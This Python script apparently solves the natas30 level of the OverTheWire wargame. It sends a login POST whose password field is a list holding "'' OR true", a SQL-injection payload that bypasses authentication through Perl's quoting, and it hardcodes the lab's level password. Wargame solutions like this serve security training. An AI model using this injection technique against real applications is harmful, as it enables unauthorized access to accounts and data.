import requests as req

url = 'http://natas30.natas.labs.overthewire.org/index.pl'
username = 'natas30'
passwd = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

r = req.post(url=url, auth=(username, passwd), data={'username': 'natas31', 'password': ["'' OR true", 2]})
print(r.text)
